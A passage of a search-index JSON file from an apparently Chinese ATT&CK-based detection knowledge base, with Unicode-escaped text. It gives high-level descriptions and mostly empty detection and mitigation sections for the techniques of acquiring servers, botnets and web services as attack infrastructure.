\u5982\u679c\u653b\u51fb\u8005\u7684\u5927\u90e8\u5206\u6d3b\u52a8\u5c06\u4f7f\u7528\u5728\u7ebf\u57fa\u7840\u8bbe\u65bd\u8fdb\u884c\uff0c\u4ed6\u4eec\u53ef\u80fd\u53ea\u9700\u8981\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u8bbe\u7f6e\u3002\u6216\u8005\uff0c\u5982\u679c\u4ed6\u4eec\u60f3\u5728\u81ea\u5df1\u7684\u7cfb\u7edf\u4e0a\u6d4b\u8bd5\u3001\u901a\u4fe1\u548c\u63a7\u5236\u5176\u6d3b\u52a8\u7684\u5176\u4ed6\u65b9\u9762\uff0c\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u5efa\u7acb\u5e7f\u6cdb\u7684\u57fa\u7840\u8bbe\u65bd\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_1","text":"\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-004-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_9","text":"MITRE-ATT&CK-T1583-004 https://attack.mitre.org/techniques/T1583/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/","text":"T1583-005-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u50f5\u5c38\u7f51\u7edc \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u8d2d\u4e70\u3001\u79df\u8d41\u6216\u79df\u7528\u4e00\u4e2a\u7531\u88ab\u7834\u574f\u7684\u7cfb\u7edf\u7ec4\u6210\u7684\u7f51\u7edc\uff0c\u4ee5\u4fbf\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u50f5\u5c38\u7f51\u7edc\u662f\u4e00\u4e2a\u7531\u88ab\u653b\u51fb\u7684\u7cfb\u7edf\u7ec4\u6210\u7684\u7f51\u7edc\uff0c\u53ef\u4ee5\u6307\u793a\u6267\u884c\u4e0b\u53d1\u7684\u4efb\u52a1\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u538b\u529b\u6d4b\u8bd5\u670d\u52a1\u4e2d\u8d2d\u4e70\u4e00\u4e2a\u73b0\u6709\u7684\u50f5\u5c38\u7f51\u7edc\u3002\u6709\u4e86\u50f5\u5c38\u7f51\u7edc\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c\u540e\u7eed\u6d3b\u52a8\uff0c\u5982\u5927\u89c4\u6a21\u7f51\u7edc\u9493\u9c7c\u6216\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\uff08DDoS\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u50f5\u5c38\u7f51\u7edc Botnet \u662f\u6307\u91c7\u7528\u4e00\u79cd\u6216\u591a\u79cd\u4f20\u64ad\u624b\u6bb5\uff0c\u5c06\u5927\u91cf\u4e3b\u673a\u611f\u67d3bot\u7a0b\u5e8f\uff08\u50f5\u5c38\u7a0b\u5e8f\uff09\u75c5\u6bd2\uff0c\u4ece\u800c\u5728\u63a7\u5236\u8005\u548c\u88ab\u611f\u67d3\u4e3b\u673a\u4e4b\u95f4\u6240\u5f62\u6210\u7684\u4e00\u4e2a\u53ef\u4e00\u5bf9\u591a\u63a7\u5236\u7684\u7f51\u7edc\u3002 \u653b\u51fb\u8005\u901a\u8fc7\u5404\u79cd\u9014\u5f84\u4f20\u64ad\u50f5\u5c38\u7a0b\u5e8f\u611f\u67d3\u4e92\u8054\u7f51\u4e0a\u7684\u5927\u91cf\u4e3b\u673a\uff0c\u800c\u88ab\u611f\u67d3\u7684\u4e3b\u673a\u5c06\u901a\u8fc7\u4e00\u4e2a\u63a7\u5236\u4fe1\u9053\u63a5\u6536\u653b\u51fb\u8005\u7684\u6307\u4ee4\uff0c\u7ec4\u6210\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u3002\u4e4b\u6240\u4ee5\u7528\u50f5\u5c38\u7f51\u7edc\u8fd9\u4e2a\u540d\u5b57\uff0c\u662f\u4e3a\u4e86\u66f4\u5f62\u8c61\u5730\u8ba9\u4eba\u4eec\u8ba4\u8bc6\u5230\u8fd9\u7c7b\u5371\u5bb3\u7684\u7279\u70b9\uff1a\u4f17\u591a\u7684\u8ba1\u7b97\u673a\u5728\u4e0d\u77e5\u4e0d\u89c9\u4e2d\u5982\u540c\u4e2d\u56fd\u53e4\u8001\u4f20\u8bf4\u4e2d\u7684\u50f5\u5c38\u7fa4\u4e00\u6837\u88ab\u4eba\u9a71\u8d76\u548c\u6307\u6325\u7740\uff0c\u6210\u4e3a\u88ab\u4eba\u5229\u7528\u7684\u4e00\u79cd\u5de5\u5177\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\uff08\u53d7\u5bb3\u8005\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u7f51\u7edc\u9493\u9c7c\u3001\u7aef\u70b9\u62d2\u7edd\u670d\u52a1\u6216\u7f51\u7edc\u62d2\u7edd\u670d\u52a1\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1583-005 https://attack.mitre.org/techniques/T1583/005/","title":"T1583-005-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u50f5\u5c38\u7f51\u7edc"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#t1583-005-","text":"","title":"T1583-005-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u50f5\u5c38\u7f51\u7edc"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u8d2d\u4e70\u3001\u79df\u8d41\u6216\u79df\u7528\u4e00\u4e2a\u7531\u88ab\u7834\u574f\u7684\u7cfb\u7edf\u7ec4\u6210\u7684\u7f51\u7edc\uff0c\u4ee5\u4fbf\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u50f5\u5c38\u7f51\u7edc\u662f\u4e00\u4e2a\u7531\u88ab\u653b\u51fb\u7684\u7cfb\u7edf\u7ec4\u6210\u7684\u7f51\u7edc\uff0c\u53ef\u4ee5\u6307\u793a\u6267\u884c\u4e0b\u53d1\u7684\u4efb\u52a1\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u538b\u529b\u6d4b\u8bd5\u670d\u52a1\u4e2d\u8d2d\u4e70\u4e00\u4e2a\u73b0\u6709\u7684\u50f5\u5c38\u7f51\u7edc\u3002\u6709\u4e86\u50f5\u5c38\u7f51\u7edc\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c\u540e\u7eed\u6d3b\u52a8\uff0c\u5982\u5927\u89c4\u6a21\u7f51\u7edc\u9493\u9c7c\u6216\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\uff08DDoS\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_1","text":"\u50f5\u5c38\u7f51\u7edc Botnet \u662f\u6307\u91c7\u7528\u4e00\u79cd\u6216\u591a\u79cd\u4f20\u64ad\u624b\u6bb5\uff0c\u5c06\u5927\u91cf\u4e3b\u673a\u611f\u67d3bot\u7a0b\u5e8f\uff08\u50f5\u5c38\u7a0b\u5e8f\uff09\u75c5\u6bd2\uff0c\u4ece\u800c\u5728\u63a7\u5236\u8005\u548c\u88ab\u611f\u67d3\u4e3b\u673a\u4e4b\u95f4\u6240\u5f62\u6210\u7684\u4e00\u4e2a\u53ef\u4e00\u5bf9\u591a\u63a7\u5236\u7684\u7f51\u7edc\u3002 \u653b\u51fb\u8005\u901a\u8fc7\u5404\u79cd\u9014\u5f84\u4f20\u64ad\u50f5\u5c38\u7a0b\u5e8f\u611f\u67d3\u4e92\u8054\u7f51\u4e0a\u7684\u5927\u91cf\u4e3b\u673a\uff0c\u800c\u88ab\u611f\u67d3\u7684\u4e3b\u673a\u5c06\u901a\u8fc7\u4e00\u4e2a\u63a7\u5236\u4fe1\u9053\u63a5\u6536\u653b\u51fb\u8005\u7684\u6307\u4ee4\uff0c\u7ec4\u6210\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u3002\u4e4b\u6240\u4ee5\u7528\u50f5\u5c38\u7f51\u7edc\u8fd9\u4e2a\u540d\u5b57\uff0c\u662f\u4e3a\u4e86\u66f4\u5f62\u8c61\u5730\u8ba9\u4eba\u4eec\u8ba4\u8bc6\u5230\u8fd9\u7c7b\u5371\u5bb3\u7684\u7279\u70b9\uff1a\u4f17\u591a\u7684\u8ba1\u7b97\u673a\u5728\u4e0d\u77e5\u4e0d\u89c9\u4e2d\u5982\u540c\u4e2d\u56fd\u53e4\u8001\u4f20\u8bf4\u4e2d\u7684\u50f5\u5c38\u7fa4\u4e00\u6837\u88ab\u4eba\u9a71\u8d76\u548c\u6307\u6325\u7740\uff0c\u6210\u4e3a\u88ab\u4eba\u5229\u7528\u7684\u4e00\u79cd\u5de5\u5177\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\uff08\u53d7\u5bb3\u8005\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u7f51\u7edc\u9493\u9c7c\u3001\u7aef\u70b9\u62d2\u7edd\u670d\u52a1\u6216\u7f51\u7edc\u62d2\u7edd\u670d\u52a1\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-005-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_9","text":"MITRE-ATT&CK-T1583-005 https://attack.mitre.org/techniques/T1583/005/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/","text":"T1583-006-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-web\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u518c\u53ef\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u7684\u7f51\u7edc\u670d\u52a1\u3002\u6709\u5404\u79cd\u6d41\u884c\u7684\u7f51\u7ad9\u4f9b\u653b\u51fb\u8005\u6ce8\u518c\u57fa\u4e8e\u7f51\u7edc\u7684\u670d\u52a1\uff0c\u8fd9\u4e9b\u670d\u52a1\u53ef\u4ee5\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\u88ab\u6ee5\u7528\uff0c\u4f8b\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\uff08\u7f51\u7edc\u670d\u52a1\uff09\u6216\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u6e17\u900f\u671f\u95f4\u3002\u4f7f\u7528\u5e38\u89c1\u7684\u670d\u52a1\uff0c\u5982\u8c37\u6b4c\u6216Twitter\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u4f7f\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u9690\u85cf\u5728\u9884\u671f\u7684\u566a\u97f3\u4e2d\u3002\u901a\u8fc7\u5229\u7528\u7f51\u7edc\u670d\u52a1\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u5176\uff08\u5a01\u80c1\u8ffd\u6eaf\u4e0a\uff09\u96be\u4ee5\u5728\u7269\u7406\u4e0a\u5c06\u884c\u52a8\u4e0e\u4e4b\u8054\u7cfb\u8d77\u6765\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5229\u7528github web\u670d\u52a1\u6784\u5efa\u6076\u610f\u4e0b\u8f7d\u94fe\u63a5\u7b49\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\uff08\u7f51\u7edc\u670d\u52a1\uff09\u6216\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u6e17\u900f\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1583-006 https://attack.mitre.org/techniques/T1583/006/","title":"T1583-006-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-web\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#t1583-006-web","text":"","title":"T1583-006-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-web\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u518c\u53ef\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u7684\u7f51\u7edc\u670d\u52a1\u3002\u6709\u5404\u79cd\u6d41\u884c\u7684\u7f51\u7ad9\u4f9b\u653b\u51fb\u8005\u6ce8\u518c\u57fa\u4e8e\u7f51\u7edc\u7684\u670d\u52a1\uff0c\u8fd9\u4e9b\u670d\u52a1\u53ef\u4ee5\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\u88ab\u6ee5\u7528\uff0c\u4f8b\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\uff08\u7f51\u7edc\u670d\u52a1\uff09\u6216\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u6e17\u900f\u671f\u95f4\u3002\u4f7f\u7528\u5e38\u89c1\u7684\u670d\u52a1\uff0c\u5982\u8c37\u6b4c\u6216Twitter\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u4f7f\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u9690\u85cf\u5728\u9884\u671f\u7684\u566a\u97f3\u4e2d\u3002\u901a\u8fc7\u5229\u7528\u7f51\u7edc\u670d\u52a1\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u5176\uff08\u5a01\u80c1\u8ffd\u6eaf\u4e0a\uff09\u96be\u4ee5\u5728\u7269\u7406\u4e0a\u5c06\u884c\u52a8\u4e0e\u4e4b\u8054\u7cfb\u8d77\u6765\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_1","text":"\u5229\u7528github web\u670d\u52a1\u6784\u5efa\u6076\u610f\u4e0b\u8f7d\u94fe\u63a5\u7b49\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\uff08\u7f51\u7edc\u670d\u52a1\uff09\u6216\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u6e17\u900f\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-006-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_9","text":"MITRE-ATT&CK-T1583-006 https://attack.mitre.org/techniques/T1583/006/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-001-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/","text":"T1584-001-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u57df\u540d \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 